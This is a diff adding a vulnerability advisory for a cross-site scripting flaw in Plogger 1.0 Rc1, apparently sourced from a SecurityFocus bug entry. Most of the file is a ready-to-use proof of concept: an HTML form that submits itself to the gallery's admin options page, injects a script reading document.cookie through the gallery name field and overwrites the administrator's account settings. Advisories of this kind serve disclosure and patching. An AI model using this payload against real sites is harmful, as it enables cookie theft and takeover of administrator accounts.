@@ -1,0 +1,21 @@
+source: http://www.securityfocus.com/bid/47329/info
+
+Plogger is prone to a cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied data.
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+
+Plogger 1.0 Rc1 is vulnerable; other versions may also be affected. 
+
+<form action="http://host/plog-admin/plog-options.php" method="post">
+<input type="hidden" name="gallery_name" value='my gallery"><script>alert(document.cookie)</script>'>
+<input type="hidden" name="gallery_url" value="http://host/">
+<input type="hidden" name="admin_username" value="Ildar">
+<input type="hidden" name="admin_email" value="valeevildar@ya.ru">
+<input type="hidden" name="admin_password" value="">
+<input type="hidden" name="confirm_admin_password" value="">
+<input type="submit" id="btn" name="submit" value="Update Options">
+
+</form>
+<script>
+document.getElementById('btn').click();
+</script>
